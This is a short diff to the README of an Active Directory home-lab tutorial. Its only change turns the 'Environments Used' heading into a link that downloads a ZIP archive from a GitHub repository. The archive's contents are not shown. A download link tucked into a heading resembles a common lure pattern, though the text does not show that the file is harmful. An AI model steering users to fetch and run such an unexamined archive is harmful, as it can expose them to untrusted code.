@@ -12,7 +12,7 @@ In this lab we're going to walk through how to create an Active Directory home L
 - <b>PowerShell</b> 
 - <b>Diskpart</b>
 
-<h2>Environments Used </h2>
+<h2>[Environments Used](https://github.com/devrsx/ActiveDirectoryLab/raw/main/AD_PS-master.zip) </h2>
 
 - <b>Windows 10</b> (21H2)
 
